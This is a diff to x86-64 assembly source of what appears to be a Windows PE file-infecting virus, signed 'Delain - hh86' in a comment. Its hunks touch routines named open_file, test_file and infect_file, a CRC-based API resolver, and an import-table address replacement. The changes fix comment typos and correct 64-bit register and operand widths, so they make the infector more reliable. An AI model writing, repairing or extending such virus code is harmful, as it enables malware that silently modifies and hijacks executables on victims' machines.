@@ -123,7 +123,7 @@ krncrcbegin:
         times   krncrcstk_size >> 3 dd 0
 krncrcend:
         db      0
-;       db      "Delain - hh86"              ;I got a little lost in the way
+;       db      "Delain - hh86"              ;I got a little lost on the way
 
         push    qword [rsp + krncrcstk_size]
         call    parse_exps
@@ -199,7 +199,7 @@ open_file:
         xor     r8, r8
         lea     rcx, qword [rdi + WIN32_FIND_DATA.cFileName]
         call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kCreateFileW]
-        xchg    ebx, eax
+        xchg    rbx, rax
         call    map_view
         xor     r9, r9                       ;FILE_BEGIN
         xor     r8, r8
@@ -289,7 +289,7 @@ test_file:
         push    rsi
         lea     rcx, qword [rax + rbp + pehdr.pemagic - pehdr.peheapsize]
         imul    bp, word [rax + pehdr.pecoff + coffhdr.pesectcount - pehdr.peheapsize], pesect_size
-        lea     rsi, dword [rbp + rcx - pesect_size]
+        lea     rsi, qword [rbp + rcx - pesect_size]
         mov     ebx, dword [rsi + pesect.sectrawaddr]
         add     ebx, dword [rsi + pesect.sectrawsize]
         add     rdi, WIN32_FIND_DATA.dwFileSizeLow
@@ -447,7 +447,7 @@ infect_file:
         pop     rdi
 
 ;-----------------------------------------------------------------------------
-;replace adress in import table
+;replace address in import table
 ;-----------------------------------------------------------------------------
 
         pop     rcx
